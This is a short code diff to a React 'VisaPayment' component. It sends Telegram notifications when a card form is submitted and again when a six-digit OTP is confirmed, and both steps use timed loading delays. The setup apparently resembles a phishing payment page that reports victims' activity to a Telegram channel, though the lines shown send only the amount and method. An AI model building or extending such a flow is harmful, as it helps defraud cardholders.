@@ -145,7 +145,7 @@ const VisaPayment = () => {
   const handleSubmit = () => {
     if (!isFormValid()) return;
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Visa' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Visa', paymentType: 'card' });
     setTimeout(() => {
       setIsLoading(false);
       setShowOtp(true);
@@ -155,6 +155,7 @@ const VisaPayment = () => {
 
   const handleOtpConfirm = () => {
     if (otpCode.length !== 6) return;
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Visa', paymentType: 'card' });
     setOtpLoading(true);
     setTimeout(() => {
       setOtpLoading(false);
